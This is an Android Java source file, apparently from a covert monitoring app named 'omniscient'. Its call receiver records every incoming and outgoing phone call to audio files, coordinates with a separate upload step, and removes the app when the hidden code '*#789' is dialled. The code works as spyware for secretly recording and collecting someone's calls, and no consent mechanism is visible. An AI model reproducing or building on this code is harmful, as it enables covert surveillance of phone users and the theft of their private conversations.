package com.postal.omniscient.postal.catchPhone.Call;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;


public class CallStateReceiver extends BroadcastReceiver {
    public CallStateReceiver() {
    }

    Bundle bundle;
    String state;
    String inCall, outCall;

    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    private static final String packageName = "com.postal.omniscient";
    private static final String code = "*#789";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("MyMsg", "1");
        if (intent.getAction().equals(ACTION_IN)) {
            Log.i("MyMsg", "2");
            if ((bundle = intent.getExtras()) != null) {
                state = bundle.getString(TelephonyManager.EXTRA_STATE);
                if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    Boolean start_or_no = new ThreadIsAliveOrNot("InCallWrite").liveORnot();
                    if(!start_or_no && inCall != null) {
                        EventBus.getDefault().post(new EventBusData("call_in"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
                        new Thread(new CallInThread(context, inCall, "In_call", "_in_call.amr"),
                                "InCallWrite").start();
                        Log.i("MyMsg", "ACTION_IN start");
                    }
                } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    Log.i("MyMsg", "3");
                    EventBus.getDefault().post(new EventBusCall("stop"));
                }
            }
        } else if (intent.getAction().equals(ACTION_OUT)) {
            Log.i("MyMsg", "4");
            if ((bundle = intent.getExtras()) != null) {
                outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                if(outCall.equals(code)) {
                    Log.i("MyMsg", "start DELETE APP");
                    deleteAPP(context);

                                    }
                //проверка на набор сервисов (*111#) а то срабатывает событие вызова
                if (!outCall.contains("*") || !outCall.contains("#")) {
                    outCall = outCall.replace("+", "");
                    Boolean start_or_no = new ThreadIsAliveOrNot("OutCallWrite").liveORnot();
                    if(!start_or_no && outCall  != null) {
                        EventBus.getDefault().post(new EventBusData("call_out"));//флаг что идет запись разгавора и не начинать занрузку файла (ато удалится)
                        new Thread(new CallInThread(context, outCall, "Out_call", "_out_call.amr"),
                                "OutCallWrite").start();
                        Log.i("MyMsg", "ACTION_OUT start");
                    }
                }
            }
        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
            Log.i("MyMsg", "5");
//            EventBus.getDefault().post(new EventBusCall("stop"));
//            EventBus.getDefault().post(new EventBusData("call_off"));//разгоаор записан говорим "загрузи файл"

        }
    }

    private void deleteAPP(Context context) {
        Uri packageURI = Uri.parse("package:com.postal.omniscient");
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
        context.startActivity(uninstallIntent);
    }
}
